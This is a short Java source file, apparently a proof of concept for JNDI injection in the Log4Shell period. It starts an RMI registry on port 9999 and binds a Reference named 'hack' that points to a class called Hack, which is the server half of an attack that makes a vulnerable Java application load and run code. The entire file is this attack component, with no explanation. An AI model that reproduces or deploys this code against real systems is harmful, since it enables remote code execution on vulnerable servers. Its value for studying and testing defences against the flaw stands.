package ai.shanshu.testlog;

import com.sun.jndi.rmi.registry.ReferenceWrapper;

import javax.naming.Reference;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

/**
 * Date: 2021/12/16 9:31 下午
 * @author yuhui
 */
public class SneakyStuff {

    public static void main(String[] args) {
        try {
            Registry registry =  LocateRegistry.createRegistry(9999);
            Reference reference = new Reference("ai.shanshu.testlog.rmi.Hack", "ai.shanshu.testlog.rmi.Hack","ai.shanshu.testlog.rmi.Hack" );
            ReferenceWrapper wrapper = new ReferenceWrapper(reference);
            registry.bind("hack",wrapper);
        }catch (Exception e){
            e.printStackTrace();
        }
    }
}
